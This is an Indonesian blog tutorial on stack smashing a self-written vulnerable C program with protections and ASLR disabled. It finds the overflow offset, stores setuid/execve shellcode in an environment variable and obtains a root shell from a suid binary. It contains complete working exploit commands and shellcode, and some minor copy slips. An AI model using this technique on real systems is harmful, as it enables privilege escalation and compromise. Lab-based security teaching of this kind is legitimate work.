---
layout: post
title:  "Stack Smashing Sederhana"
author: Didik
categories: jekyll update
---

Stack smashing merupakan teknik yang dapat digunakan untuk bisa berkeliaran diluar fungsi atau variabel. Langsung saja kita ke tutorial stack smashing. Diketahui kode berikut ini : beri nama oke.c

```c
#include <stdio.h>
#include <unistd.h>
#define BATASAN 500

int main(int argc, char *argv[]) {
	printf("Berikut ini adalah programnya\n");
	char buf[80];
	int c;
	c = read(0, buf, BATASAN);
	printf("Terbaca %d, isinya : %s\n", c, buf);
	return 0;
}
```

Dari kode diatas dapat dilihat batasan kita masukin nilai c nya adalah 500, sehingga ketika kita menginputkan buf lebih dari 80, yang 520 nya kemana ? coba kita compile, dan lihat apa yang terjadi (Matikan dulu stack protectornya dan ASLR), dengan mengikuti perintah berikut ini :

```console
user@localhost:~$ gcc -g -fno-stack-protector oke.c -o oke
user@localhost:~$ sudo su
[sudo] password for	user:
user@localhost:~# echo 0 > /proc/sys/kernel/randomize_va_space
user@localhost:~# exit
user@localhost:~$
```

Dari kode diatas dapat dilihat batasan kita masukin nilai c nya adalah 500, sehingga ketika kita menginputkan buf lebih dari 80, yang 420 nya kemana ? coba kita compile, dan lihat apa yang terjadi (Matikan dulu stack protectornya dan ASLR), dengan mengikuti perintah berikut ini :

```console
user@localhost:~$ gcc -g -fno-stack-protector -z execstack oke.c -o oke
user@localhost:~$ sudo su
[sudo] password for	user:
user@localhost:~# echo 0 > /proc/sys/kernel/randomize_va_space
user@localhost:~# exit
user@localhost:~$
```

Untuk memastikan stack protector mati. Coba jalankan programnya dan masukkan inputan A 80, 100, 200, sampai 300 kali, dan terus tambah sampai core dumped. Abaikan karakter aneh di paling kanan. Ini juga merupakan cara untuk mengetahui byte offset sebelum Terjadi segmentation fault. Dalam case ini saya dapati byte offsetnya ada di byte ke 104, karena pada byte 105 dia Segmentation Fault (Dengan cara coba-coba :D).

```console
user@localhost:~$ ./oke
Berikut ini adalah programnya
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Terbaca 80, isinya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
user@localhost:~$ ./oke
Berikut ini adalah programnya
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Terbaca 100, isinya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAd
user@localhost:~$ ./oke
Berikut ini adalah programnya
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Terbaca 105, isinnya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhy
Segmentation fault (core dumped)
```

Kalau mau gampang menggunakan perl inline dan outputnya di copas saat input data pada program oke
```console
user@localhost:~$ perl -e '{print("A"x105);}'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
user@localhost:~$ ./oke
Berikut ini adalah programnya
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Terbaca 105, isinnya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhy
Segmentation fault (core dumped)
```

Atau cara yang lebih cepat, dengan cara memetakan keluaran dari perintah perl sebagai STDIN untuk perintah ./oke dengan menggunakan piping perintah

```console
user@localhost:~$ perl -e '{print("A"x105);}' | ./oke
Terbaca 105, isinnya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAhy
Segmentation fault (core dumped)
```

Setelah kita mengetahui byte offsetnya kita bisa pakai untuk buat struktur exploitnya. Pertama-tama kita cari cara untuk menjalankan execve("/bin/sh");
Dapat diperoleh [disini](http://shell-storm.org/shellcode/files/shellcode-806.php), dibagian code[].

```c
char[] = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05";
```

Cara menggunakan shellcode diatas adalah dengan cara menambahkannya pada environment variable. Kemudian alamat dari envar pada ./oke akan di cari dengan menggunakan getenvaddr

```console
user@localhost:~$ git clone https://github.com/historypeats/getenvaddr
Cloning into 'getenvaddr'...
remote: Enumerating objects: 18, done.
remote: Counting objects: 100% (18/18), done.
remote: Compressing objects: 100% (13/13), done.
remote: Total 18 (delta 4), reused 18 (delta 4), pack-reused 0
Unpacking objects: 100% (18/18), done.
user@localhost:~$ gcc ./getenvaddr/getenvaddr.c -o gea
user@localhost:~$ export export PWN=`perl -e '{printf("\x48\x31\xff\xb0\x69\x0f\x05\x48\x31\xd2\x48\xbb\xff\x2f\x62\x69\x6e\x2f\x73\x68\x48\xc1\xeb\x08\x53\x48\x89\xe7\x48\x31\xc0\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05\x6a\x01\x5f\x6a\x3c\x58\x0f\x05");}'`

user@localhost:~$ ./gea PWN ./oke
PWN will be at 0x7fffffffe4a7
```

Kita buat file untuk input, dari ./oke, dan kita tahan dengan menggunakan cat
```console
user@localhost:~$ perl -e '{print("A"x104,"\xa7\xe4\xff\xff\xff\x7f");}' > in.txt
user@localhost;~$ (cat in.txt ; cat) | ./oke
Berikut ini adalah programnya
Terbaca 112, isinya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAn
id
uid=1000(user) gid=1000(user) groups=1000(user),90(network),98(power),991(lp),998(wheel)
```

Lalu kita ubah agar program berjalan dengan suid root.

```console
user@localhost:~$ sudo chown root:root ./oke
user@localhost:~$ sudo chmod 4755 ./oke
```

Kita coba lagi

```console
user@localhost:~$ (cat in.txt ; cat) | ./oke
Berikut ini adalah programnya
Terbaca 112, isinya : AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp
id
uid=0(root) gid=1000(user) groups=1000(user),90(network),98(power),991(lp),998(wheel)
^C
user@localhost:~$ 
```


# Sumber
Untuk shellcodenya dapat diperoleh [disini](http://shell-storm.org/shellcode/files/shellcode-77.php)
Untuk getenvaddr dapat diperoleh [disini](https://github.com/historypeats/getenvaddr)
Sumber bahasa inggris (lebih pro) [disini](https://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/)

# Note
Untuk tutorial bahasa inggris shellcodenya pada distro tertentu tidak dapat digunakan, bedanya shellcode disini menggunakan setuid(0) + execve("/bin/sh");
{% include disqus.html %}
